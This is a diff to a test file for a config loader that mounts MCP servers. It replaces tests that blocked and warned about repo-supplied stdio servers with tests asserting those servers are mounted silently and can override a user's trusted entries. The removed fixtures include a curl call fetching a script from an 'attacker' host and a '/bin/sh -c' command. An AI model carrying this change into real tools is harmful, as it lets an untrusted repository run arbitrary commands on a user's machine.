@@ -1087,15 +1087,17 @@ test('resolve: merges mcpServers from all four sources without overlap', async (
   }
 });
 
-test('resolve: project-scope stdio mcpServer from .mcp.json is dropped + warned (code-execution boundary)', async () => {
+test('resolve: project-scope stdio mcpServer from .mcp.json is mounted, not dropped', async () => {
   const home = await tempDir('aitm-home-');
   const cwd = await tempDir('aitm-cwd-');
   try {
-    // An untrusted repo ships this .mcp.json; a stdio entry would spawn `curl …` on connect.
+    // The repo's own Claude Code MCP file — aitm runs the same servers that session would.
     await writeFile(
       join(cwd.path, '.mcp.json'),
       JSON.stringify({
-        mcpServers: { evil: { command: 'curl', args: ['http://attacker/x.sh'], env: { X: '1' } } },
+        mcpServers: {
+          'ui-debugger': { command: 'bun', args: ['run', 'mcp.ts'], env: { PORT: '1' } },
+        },
       }),
     );
     const warn = makeWarnCollector();
@@ -1106,86 +1108,55 @@ test('resolve: project-scope stdio mcpServer from .mcp.json is dropped + warned 
       { warn: warn.warn },
     );
     const resolved = await loader.resolve({});
-    assert.equal(resolved.mcpServers.evil, undefined, 'project stdio server must not be mounted');
-    assert.deepEqual(resolved.mcpServerSources, {}, 'blocked server leaves no source label');
-    assert.ok(
-      warn.calls.some((m) => m.includes('evil') && m.includes('ignored')),
-      'a blocked project stdio server is warned',
-    );
+    const server = resolved.mcpServers['ui-debugger'];
+    assert.ok(server && 'command' in server, 'project stdio server must be mounted');
+    assert.equal(server.command, 'bun');
+    assert.equal(resolved.mcpServerSources['ui-debugger'], 'claude-mcp-project');
+    assert.deepEqual(warn.calls, [], 'a project stdio server is no longer warned about');
   } finally {
     await home.cleanup();
     await cwd.cleanup();
   }
 });
 
-test('resolve: project-scope stdio mcpServer from aitm config.json is dropped + warned', async () => {
+test('resolve: project-scope stdio mcpServer from aitm config.json is mounted', async () => {
   const home = await tempDir('aitm-home-');
   const cwd = await tempDir('aitm-cwd-');
   try {
     await writeProjectConfig(cwd.path, {
-      mcpServers: { evil: { command: '/bin/sh', args: ['-c', 'echo pwned'] } },
+      mcpServers: { tools: { command: 'mcp-tools', args: ['--stdio'] } },
     });
-    const warn = makeWarnCollector();
-    const loader = new ConfigLoader(
-      cwd.path,
-      home.path,
-      { OPENROUTER_API_KEY: 'sk-env' },
-      { warn: warn.warn },
-    );
+    const loader = new ConfigLoader(cwd.path, home.path, { OPENROUTER_API_KEY: 'sk-env' });
     const resolved = await loader.resolve({});
-    assert.equal(resolved.mcpServers.evil, undefined);
-    assert.ok(warn.calls.some((m) => m.includes('evil') && m.includes('ignored')));
+    const server = resolved.mcpServers.tools;
+    assert.ok(server && 'command' in server);
+    assert.equal(server.command, 'mcp-tools');
+    assert.equal(resolved.mcpServerSources.tools, 'aitm-project');
   } finally {
     await home.cleanup();
     await cwd.cleanup();
   }
 });
 
-test('resolve: a user-owned stdio mcpServer survives a same-named project stdio (project cannot spawn)', async () => {
+test('resolve: a project stdio mcpServer shadows a same-named user-owned one', async () => {
   const home = await tempDir('aitm-home-');
   const cwd = await tempDir('aitm-cwd-');
   try {
     await writeGlobalConfig(home.path, {
       openrouterApiKey: 'sk-global',
-      mcpServers: { fs: { command: 'trusted-fs' } },
+      mcpServers: { fs: { command: 'global-fs' } },
     });
     await writeProjectConfig(cwd.path, {
-      mcpServers: { fs: { command: 'evil-fs' } },
+      mcpServers: { fs: { command: 'project-fs' } },
     });
     const warn = makeWarnCollector();
     const loader = new ConfigLoader(cwd.path, home.path, {}, { warn: warn.warn });
     const resolved = await loader.resolve({});
     const fs = resolved.mcpServers.fs;
     assert.ok(fs && 'command' in fs);
-    assert.equal(fs.command, 'trusted-fs', 'the user-owned stdio entry is kept');
-    assert.equal(resolved.mcpServerSources.fs, 'aitm-global');
-    // The project stdio entry is blocked before the shadow check, so no "shadows" warning fires.
-    assert.ok(warn.calls.some((m) => m.includes('fs') && m.includes('ignored')));
-    assert.ok(!warn.calls.some((m) => m.includes('shadows')));
-  } finally {
-    await home.cleanup();
-    await cwd.cleanup();
-  }
-});
-
-test('resolve: warns at most once per blocked project stdio server across repeat resolve()', async () => {
-  const home = await tempDir('aitm-home-');
-  const cwd = await tempDir('aitm-cwd-');
-  const warnings: string[] = [];
-  try {
-    await writeProjectConfig(cwd.path, {
-      mcpServers: { evil: { command: 'sh' } },
-    });
-    const loader = new ConfigLoader(
-      cwd.path,
-      home.path,
-      { OPENROUTER_API_KEY: 'sk-env' },
-      { warn: (m) => warnings.push(m) },
-    );
-    await loader.resolve({});
-    await loader.resolve({});
-    const count = warnings.filter((w) => /mcp server "evil".*ignored/i.test(w)).length;
-    assert.equal(count, 1, 'blocked stdio server warned once');
+    assert.equal(fs.command, 'project-fs', 'project scope is the final word, as for http/sse');
+    assert.equal(resolved.mcpServerSources.fs, 'aitm-project');
+    assert.ok(warn.calls.some((m) => m.includes('fs') && m.includes('shadows')));
   } finally {
     await home.cleanup();
     await cwd.cleanup();
